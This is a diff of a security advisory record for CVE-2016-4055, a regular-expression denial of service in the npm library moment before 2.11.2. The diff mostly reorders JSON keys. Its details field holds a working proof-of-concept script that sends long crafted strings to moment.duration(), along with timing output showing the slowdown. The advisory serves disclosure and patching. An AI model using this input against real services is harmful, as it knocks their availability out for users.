@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-87vv-r9j6-g5qv",
-  "summary": "Regular Expression Denial of Service in moment",
-  "details": "Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.\n\n\n## Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i<=10000000;i=i+10000) {\n    console.log(\"COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH: 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH: 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH: 60006\n[ 5, 651335262 ]\n```\n\n\n## Recommendation\n\nPlease update to version 2.11.2 or later. ",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2017/10/GHSA-87vv-r9j6-g5qv/GHSA-87vv-r9j6-g5qv.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "moment",
+        "purl": "pkg:npm/moment"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2016-4055"
   ],
-  "modified": "2023-11-08T03:58:28.366374Z",
-  "published": "2017-10-24T18:33:35Z",
   "database_specific": {
-    "nvd_published_at": "2017-01-23T21:59:00Z",
-    "github_reviewed_at": "2020-06-16T21:24:44Z",
-    "severity": "MODERATE",
-    "github_reviewed": true,
     "cwe_ids": [
       "CWE-400"
-    ]
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-06-16T21:24:44Z",
+    "nvd_published_at": "2017-01-23T21:59:00Z",
+    "severity": "MODERATE"
   },
+  "details": "Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.\n\n\n## Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i<=10000000;i=i+10000) {\n    console.log(\"COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH: 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH: 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH: 60006\n[ 5, 651335262 ]\n```\n\n\n## Recommendation\n\nPlease update to version 2.11.2 or later. ",
+  "id": "GHSA-87vv-r9j6-g5qv",
+  "modified": "2023-11-08T03:58:28.366374Z",
+  "published": "2017-10-24T18:33:35Z",
   "references": [
     {
       "type": "ADVISORY",
@@ -66,36 +90,12 @@
       "url": "http://www.securityfocus.com/bid/95849"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "moment",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/moment"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "2.11.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2017/10/GHSA-87vv-r9j6-g5qv/GHSA-87vv-r9j6-g5qv.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Regular Expression Denial of Service in moment"
 }
